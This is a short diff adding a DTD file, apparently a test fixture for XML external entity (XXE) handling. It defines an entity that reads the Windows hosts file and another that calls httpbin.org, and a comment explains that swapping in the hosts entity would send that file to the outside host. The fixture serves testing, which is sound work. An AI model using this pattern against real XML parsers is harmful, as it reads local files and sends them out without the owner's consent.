@@ -1,0 +1,10 @@
+﻿<!ENTITY % hosts SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
+
+<!-- If you replace the value "testing" with "%hosts;" in the following
+definition of parameter entity "leak" it will send your hosts file to httpbin.org!!
+Clearly not something you want to do by accident. -->
+<!ENTITY % leak SYSTEM "https://httpbin.org/get?hello=testing">
+
+<!ENTITY proof "<![CDATA[%leak;]]>">
+
+  
